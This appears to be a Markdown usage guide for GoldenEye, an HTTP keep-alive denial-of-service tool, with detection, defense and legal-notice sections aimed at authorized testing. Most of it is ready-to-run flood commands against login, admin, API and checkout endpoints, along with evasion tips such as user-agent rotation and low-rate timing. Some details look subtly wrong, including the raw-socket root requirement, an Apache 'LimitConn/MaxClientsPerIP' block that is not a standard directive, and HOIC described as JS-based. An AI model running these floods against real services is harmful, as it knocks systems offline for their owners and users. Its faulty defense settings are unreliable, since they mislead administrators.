# GoldenEye - HTTP DoS Testing Tool

## Overview

GoldenEye is a Python 3-based Layer 7 Denial of Service testing tool designed to evaluate the resilience of web servers against HTTP-based attacks. It exploits the HTTP Keep-Alive mechanism combined with cache-control headers to consume server resources, making it effective against servers that do not properly implement connection limits or timeout handling.

**Author**: Jan Seidl (jseidl)
**License**: GPLv3
**Language**: Python 3
**Category**: Impact / DoS Testing

### How It Works

GoldenEye operates at the application layer (Layer 7) by establishing multiple persistent HTTP connections and sending specially crafted requests. The attack vector exploits two HTTP features:

1. **HTTP Keep-Alive**: Maintains open connections, consuming server thread/worker resources
2. **NoCache Headers**: Forces the server to generate fresh responses instead of serving cached content

Each worker thread creates multiple sockets that maintain persistent connections to the target. The server must allocate memory and processing resources for each connection, eventually exhausting available resources.

### Key Characteristics

- Uses multiprocessing for high concurrency
- Supports both GET and POST methods
- Randomized User-Agent strings to evade basic filtering
- SSL certificate verification can be disabled
- Configurable worker count and socket connections per worker

## Installation

### Kali Linux

GoldenEye is pre-installed on Kali Linux or can be installed via the package manager:

```bash
sudo apt update
sudo apt install goldeneye
```

### Manual Installation from GitHub

```bash
git clone https://github.com/jseidl/GoldenEye.git
cd GoldenEye
chmod +x goldeneye.py
```

### Dependencies

- Python 3.x
- No external Python packages required (uses standard library)

## Usage

### Basic Syntax

```
./goldeneye.py <url> [OPTIONS]
```

### Command-Line Options

| Option | Description | Default |
|--------|-------------|---------|
| `-u, --useragents` | File with user-agents to use | Randomly generated |
| `-w, --workers` | Number of concurrent workers | 50 |
| `-s, --sockets` | Number of concurrent sockets | 30 |
| `-m, --method` | HTTP Method: get, post, or random | get |
| `-d, --debug` | Enable Debug Mode (verbose output) | False |
| `-n, --nosslcheck` | Do not verify SSL Certificate | True |
| `-h, --help` | Shows help | - |

### Basic Attack

```bash
# Simple GET flood
./goldeneye.py http://target.com

# POST flood
./goldeneye.py http://target.com -m post

# Custom workers and sockets
./goldeneye.py http://target.com -w 100 -s 50
```

### Advanced Usage

```bash
# Use custom User-Agent list
./goldeneye.py http://target.com -u /path/to/useragents.txt

# SSL target with debug mode
./goldeneye.py https://target.com -d

# Maximum stress test
./goldeneye.py http://target.com -w 200 -s 100 -m random

# Disable SSL verification
./goldeneye.py https://target.com -n true
```

## Attack Scenarios

### Scenario 1: Web Server Resilience Testing

**Objective**: Test if a web server can handle sustained connection load

```bash
# Start with low intensity
./goldeneye.py http://target.com -w 10 -s 5

# Gradually increase
./goldeneye.py http://target.com -w 50 -s 25

# Full test
./goldeneye.py http://target.com -w 100 -s 50
```

### Scenario 2: Load Balancer Testing

**Objective**: Verify load balancer distributes connections properly

```bash
# Run from multiple sources simultaneously
./goldeneye.py http://loadbalancer.com -w 100 -s 30 -m get
```

### Scenario 3: Connection Limit Validation

**Objective**: Test server connection limiting configuration

```bash
# Test with known limits
./goldeneye.py http://target.com -w 200 -s 100 -d
# Monitor server logs for connection limit errors
```

### Scenario 4: Post-Based Application Testing

**Objective**: Test form submission endpoints

```bash
./goldeneye.py http://target.com/login -m post -w 50 -s 20
```

## Evasion Techniques

### User-Agent Rotation

Create a custom user-agents.txt file:

```
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36
Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)
```

```bash
./goldeneye.py http://target.com -u useragents.txt
```

### Request Randomization

Use the random method option to vary request types:

```bash
./goldeneye.py http://target.com -m random
```

## Detection Methods

### Network-Level Detection

1. **Connection Monitoring**: Watch for multiple persistent connections from single IP
2. **Rate Limiting**: Implement per-IP connection limits
3. **Traffic Analysis**: Look for Keep-Alive requests without cache headers

### Server-Side Detection

```bash
# Monitor connection count
netstat -an | grep :80 | wc -l

# Watch for specific patterns in access logs
tail -f /var/log/apache2/access.log | grep "Keep-Alive"
```

### IDS/IPS Signatures

- Multiple rapid HTTP connections from single source
- Unusual User-Agent string patterns
- Absence of typical browser behavior (no resource loading)

## Defense Mechanisms

### Web Server Configuration

**Apache (.htaccess or httpd.conf)**:
```apache
# Limit concurrent connections per IP
<LimitConn>
    MaxClientsPerIP 10
</LimitConn>

# Connection timeout
Timeout 30

# Keep-Alive settings
KeepAlive On
KeepAliveTimeout 5
MaxKeepAliveRequests 100
```

**Nginx (nginx.conf)**:
```nginx
# Rate limiting
limit_conn_zone $binary_remote_addr zone=connlimit:10m;
limit_conn connlimit 10;

# Request rate limiting
limit_req_zone $binary_remote_addr zone=ratelimit:10m rate=10r/s;
limit_req zone=ratelimit burst=20 nodelay;
```

### Application-Level Defense

```python
# Flask example
from flask_limiter import Limiter

limiter = Limiter(app, key_func=get_remote_address)

@app.route('/api')
@limiter.limit("10 per minute")
def api_endpoint():
    return "OK"
```

### Infrastructure Defense

- Deploy Web Application Firewall (WAF)
- Use CDN services (Cloudflare, AWS CloudFront)
- Implement geographic IP blocking
- Configure SYN cookies for TCP stack protection

## Real-World Applications

### Legitimate Use Cases

1. **Penetration Testing**: Verify web application resilience during security assessments
2. **Capacity Planning**: Determine server resource limits before deployment
3. **DR Testing**: Validate failover mechanisms under load
4. **Compliance Testing**: Meet PCI-DSS or SOC2 requirements for availability testing

### Testing Methodology

```
1. Establish baseline metrics (response time, throughput)
2. Start with minimal load (5-10 workers)
3. Gradually increase until degradation observed
4. Document breaking point and recovery behavior
5. Implement mitigations and re-test
6. Generate report with findings
```

## Troubleshooting

### Common Issues

**Connection Refused**
```bash
# Check if target is reachable
curl -v http://target.com
# Verify port is open
nmap -p 80,443 target.com
```

**SSL Certificate Errors**
```bash
# Disable SSL verification
./goldeneye.py https://target.com -n true
```

**Low Performance**
```bash
# Check system limits
ulimit -n
# Increase if needed (run as root)
ulimit -n 65535
```

**Permission Denied**
```bash
# GoldenEye needs root for raw sockets
sudo ./goldeneye.py http://target.com
```

## Technical Deep Dive

### HTTP Keep-Alive Mechanism

HTTP Keep-Alive (persistent connections) allows multiple HTTP requests/responses over a single TCP connection. While this improves performance for legitimate traffic, it creates a vulnerability:

```
Normal Behavior:
Client -> Server: GET /page.html
Server -> Client: 200 OK + Data
[Connection closes after timeout or max requests]

Keep-Alive Exploitation:
Client -> Server: GET /page.html
Server -> Client: 200 OK + Data
[Connection stays open]
Client -> Server: GET /page.html (No-Cache)
Server -> Client: 200 OK + Fresh Data (not cached)
[Repeat thousands of times per connection]
```

The server must:
1. Maintain connection state in memory
2. Process each request fully (no caching)
3. Allocate thread/worker resources
4. Handle TCP stack overhead

### GoldenEye Architecture

```
GoldenEye Process
    |
    +-- Worker Process 1
    |       |
    |       +-- Socket 1 (persistent connection)
    |       +-- Socket 2 (persistent connection)
    |       +-- Socket N...
    |
    +-- Worker Process 2
    |       |
    |       +-- Socket 1
    |       +-- Socket 2
    |       +-- Socket N...
    |
    +-- Worker Process N...
```

Each worker creates multiple persistent connections. With default settings (50 workers, 30 sockets), GoldenEye maintains 1,500 simultaneous connections.

### Request Structure

GoldenEye sends specially crafted HTTP requests:

```http
GET / HTTP/1.1
Host: target.com
Connection: keep-alive
Cache-Control: no-cache, no-store, must-revalidate
Pragma: no-cache
Expires: 0
User-Agent: [randomized]
```

The `no-cache` directives force the server to generate fresh content for every request, preventing cache hits.

## Advanced Scenarios

### Scenario 5: API Stress Testing

**Objective**: Test REST API rate limiting and resilience

```bash
# Test API endpoint
./goldeneye.py http://api.target.com/v1/users -m get -w 25 -s 10

# Test with authentication
./goldeneye.py http://api.target.com/v1/data -m get -w 50 -s 20

# Monitor API response codes
tail -f /var/log/api/access.log | awk '{print $9}' | sort | uniq -c
```

### Scenario 6: E-Commerce Platform Testing

**Objective**: Test shopping cart and checkout under load

```bash
# Test product pages
./goldeneye.py http://shop.target.com/products -w 100 -s 50

# Test search functionality
./goldeneye.py "http://shop.target.com/search?q=test" -w 50 -s 25

# Test checkout endpoint
./goldeneye.py http://shop.target.com/checkout -m post -w 25 -s 10
```

### Scenario 7: Content Management System

**Objective**: Test WordPress/CMS under sustained load

```bash
# Test homepage
./goldeneye.py http://cms.target.com/ -w 50 -s 25

# Test admin panel
./goldeneye.py http://cms.target.com/wp-admin/ -m post -w 10 -s 5

# Test login endpoint
./goldeneye.py http://cms.target.com/wp-login.php -m post -w 20 -s 10
```

### Scenario 8: Microservices Testing

**Objective**: Test service mesh and API gateway

```bash
# Test service discovery
./goldeneye.py http://discovery.target.com/health -w 30 -s 15

# Test load balancer
./goldeneye.py http://lb.target.com/api -w 100 -s 50

# Test circuit breaker
./goldeneye.py http://gateway.target.com/service -w 200 -s 100
```

## Performance Metrics

### Measuring Attack Effectiveness

```bash
# Monitor server response time
watch -n 1 'curl -o /dev/null -s -w "%{time_total}\n" http://target.com'

# Monitor server connections
watch -n 1 'netstat -an | grep :80 | wc -l'

# Monitor server CPU
top -bn1 | grep "Cpu(s)" | awk '{print $2}'

# Monitor server memory
free -m | grep Mem
```

### Client-Side Metrics

GoldenEye displays:
- Worker status (active/idle)
- Socket count per worker
- Connection errors
- Request rate

### Server-Side Indicators

When the attack is effective:
- Response time increases dramatically
- 503/504 error codes appear
- Connection refused errors
- Server crashes or restarts

## Comparison with Other Tools

| Feature | GoldenEye | Slowhttptest | HULK | HOIC |
|---------|-----------|--------------|------|------|
| Layer | L7 HTTP | L7 HTTP | L7 HTTP | L7 HTTP |
| Method | Keep-Alive | Slow headers | Random URLs | JS-based |
| Concurrency | Multi-process | Multi-thread | Multi-thread | Multi-thread |
| Evasion | User-Agent | Slow pace | Random URLs | Bandwidth |
| Best For | Connection exhaustion | Slowloris variant | High bandwidth | DDoS |

## System Requirements

### Minimum Requirements

```
- OS: Linux, macOS, Windows (with Python 3)
- Python: 3.6+
- RAM: 512MB (depends on worker/socket count)
- Network: 10 Mbps+
- Privileges: Root/sudo for raw sockets
```

### Recommended Setup

```
- OS: Kali Linux
- Python: 3.8+
- RAM: 2GB+
- Network: 100 Mbps+
- CPU: Multi-core for high concurrency
```

### Scaling Considerations

```bash
# For high-impact testing (use with caution!)
ulimit -n 65535
./goldeneye.py http://target.com -w 500 -s 200 -m random

# Monitor local resources
htop
iftop
```

## Advanced Configuration

### Custom User-Agent Pool

Create `useragents.txt` with realistic browser strings:

```
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1
Mozilla/5.0 (iPad; CPU OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0
Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0
Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0
```

### Timing Configuration

```bash
# Fast attack (high impact)
./goldeneye.py http://target.com -w 100 -s 50

# Moderate (balanced)
./goldeneye.py http://target.com -w 50 -s 25

# Slow and low (evasion)
./goldeneye.py http://target.com -w 10 -s 5
```

## Integration with Other Tools

### Pre-Attack Reconnaissance

```bash
# Scan target first
nmap -sV -p 80,443 target.com

# Check web technology
whatweb http://target.com

# Then attack
./goldeneye.py http://target.com -w 50 -s 25
```

### Post-Attack Analysis

```bash
# Check server status
curl -I http://target.com

# Monitor recovery
tail -f /var/log/apache2/access.log

# Document findings
echo "Attack completed at $(date)" >> attack_log.txt
```

## Common Mistakes to Avoid

1. **Too aggressive too fast**: Start low, increase gradually
2. **No baseline**: Always measure normal performance first
3. **Ignoring server logs**: Monitor for errors during test
4. **No authorization**: Always get written permission
5. **Testing production**: Use staging environments when possible

## Limitations

- Python GIL may limit true parallelism on single core
- Effectiveness depends on server implementation
- Modern servers with proper connection pooling may be more resilient
- Does not work well against CDN-backed applications
- Single-machine testing may not represent distributed load
- HTTP/2 and HTTP/3 have different connection models
- WebSocket connections are not targeted

## Legal Notice

This tool is provided for authorized security testing and educational purposes only. Unauthorized use against systems you do not own or have explicit permission to test is illegal and unethical. Always obtain written authorization before performing any stress testing.

**Before Testing**:
- Obtain written authorization from system owner
- Define scope and time window
- Notify operations team
- Have rollback plan ready
- Document all actions

**During Testing**:
- Monitor server health
- Be ready to stop if issues occur
- Document all observations
- Keep communications open

**After Testing**:
- Restore normal operations
- Generate comprehensive report
- Share findings with stakeholders
- Recommend mitigations

## References

- OWASP Testing Guide - Testing for Denial of Service
- RFC 2616 - HTTP/1.1 Specification
- RFC 7230 - HTTP/1.1 Message Syntax and Routing
- GoldenEye GitHub Repository
- Web Application Security Testing Guide
- HTTP Keep-Alive Best Practices
